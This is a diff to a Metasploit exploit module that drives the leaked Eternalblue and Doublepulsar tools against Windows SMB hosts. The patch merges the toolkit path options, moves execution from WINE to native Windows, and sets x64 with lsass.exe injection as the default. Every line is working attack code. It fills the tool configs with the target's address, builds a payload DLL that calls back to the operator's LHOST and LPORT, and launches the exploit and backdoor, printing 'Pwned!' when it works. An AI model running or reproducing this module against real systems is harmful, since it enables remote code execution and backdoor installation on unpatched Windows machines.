@@ -17,12 +17,9 @@ class MetasploitModule < Msf::Exploit::Remote
       'Author'      =>
         [
           'Pablo Gonzalez (@pablogonzalezpe)',
-          'Sheila A. Berta (@UnaPibaGeek)'
+          'Sheila A. Berta (@UnaPibaGeek)',
+          'BUPTCZQ'
         ],
-		'Payload'        =>
-        {
-          'BadChars'   => "\x00\x0a\x0d",
-        },
       'Platform'       => 'win',
       'DefaultTarget'  => 8,
       'Targets'        =>
@@ -39,18 +36,16 @@ class MetasploitModule < Msf::Exploit::Remote
 	],
       'Arch'           => [ARCH_X86,ARCH_X64],
 	  'ExitFunc'	   => 'thread',
-	  'Target'		   => 0,
+	  'Target'		   => 8,
       'License'     => MSF_LICENSE,
 		)
 
 		)
 
 	register_options([
-		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x64']]),
-		OptString.new('ETERNALBLUEPATH',[true,'Path directory of Eternalblue','/root/shadowbroker/windows/lib/x86-Windows/']),
-		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/root/shadowbroker/windows/lib/x86-Windows/']),
-		OptString.new('WINEPATH',[true,'WINE drive_c path','/root/.wine/drive_c/']),
-		OptString.new('PROCESSINJECT',[true,'Name of process to inject into (Change to lsass.exe for x64)','wlms.exe'])
+		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x64',['x86','x64']]),
+		OptString.new('TOOLKITPATH',[true,'Path directory of Eternalblue toolkit','d:\\shadowbroker\\windows\\lib\\x86-Windows\\']),
+		OptString.new('PROCESSINJECT',[true,'Name of process to inject into (wlms.exe for x86, lsass.exe for x64)','lsass.exe'])
 	], self.class)
 
   register_advanced_options([
@@ -64,10 +59,10 @@ class MetasploitModule < Msf::Exploit::Remote
 
   #Custom XML Eternalblue
   print_status('Generating Eternalblue XML data')
-  cp = `cp #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.Skeleton.xml #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
+  cp = `cp #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.Skeleton.xml #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
+  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
+  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
+  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
 
   #WIN72K8R2 (4-8) and XP (0-3)
   if target.name =~ /7|2008|Vista/
@@ -76,33 +71,33 @@ class MetasploitModule < Msf::Exploit::Remote
 	objective = "XP"
   end
 
-  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
+  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
 
   #Custom XML Doublepulsar
   print_status('Generating Doublepulsar XML data')
-  cp = `cp #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.Skeleton.xml #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  dllpayload = datastore['WINEPATH'] + datastore['DLLName']
-  dllpayload2 = dllpayload.gsub('/','\/')
-  sed = `sed -i 's/%DLLPAY%/#{dllpayload2}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%PROCESSINJECT%/#{datastore['PROCESSINJECT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
+  cp = `cp #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.Skeleton.xml #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
+  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
+  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
+  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
+  sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
+  sed = `sed -i 's/%DLLPAY%/#{datastore['DLLName']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
+  sed = `sed -i 's/%PROCESSINJECT%/#{datastore['PROCESSINJECT']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
 
   #Generate DLL
+  dllpayload = File.join(datastore['TOOLKITPATH'], datastore['DLLName'])
   print_status("Generating payload DLL for Doublepulsar")
   pay = framework.modules.create(datastore['payload'])
   pay.datastore['LHOST'] = datastore['LHOST']
+  pay.datastore['LPORT'] = datastore['LPORT']
   dll = pay.generate_simple({'Format'=>'dll'})
-  File.open(datastore['WINEPATH']+datastore['DLLName'],'w') do |f|
+  File.open(dllpayload,'wb') do |f|
 	print_status("Writing DLL in #{dllpayload}")
 	f.print dll
   end
 
   #Send Exploit + Payload Injection
   print_status('Launching Eternalblue...')
-  output = `cd #{datastore['ETERNALBLUEPATH']}; wine Eternalblue-2.2.0.exe`
+  output = `cd /d #{datastore['TOOLKITPATH']} && Eternalblue-2.2.0.exe`
   if output =~ /=-=-WIN-=-=/
   	print_good("Pwned! Eternalblue success!")
   elsif output =~ /Backdoor returned code: 10 - Success!/
@@ -111,7 +106,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	print_error("Are you sure it's vulnerable?")
   end
   print_status('Launching Doublepulsar...')
-  output2 = `cd #{datastore['DOUBLEPULSARPATH']}; wine Doublepulsar-1.3.1.exe`
+  output2 = `cd /d #{datastore['TOOLKITPATH']} && Doublepulsar-1.3.1.exe`
   if output2 =~ /Backdoor returned code: 10 - Success!/
 	print_good("Remote code executed... 3... 2... 1...")
   else
